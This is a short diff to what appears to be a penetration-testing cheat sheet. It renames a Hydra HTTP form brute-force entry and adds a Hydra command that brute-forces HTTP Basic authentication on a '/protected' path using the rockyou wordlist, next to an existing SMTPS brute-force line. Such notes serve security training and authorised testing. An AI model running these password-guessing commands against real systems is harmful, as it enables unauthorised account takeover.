@@ -17,7 +17,10 @@
 * Metasploit
 ### Hydra
 `hydra -L useranme.txt -P passwords.txt IP/DOMAIN_NAME http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid creds or something" -V -f`
->Login form brute-forcing
+>HTTP form brute-forcing
+
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt IP http-get "/protected" -V -f`
+>HTTP Basic auth
 
 `hydra -l user -P list.lst IP smtps -V -f`
 >SMTP/S Brute-forcing
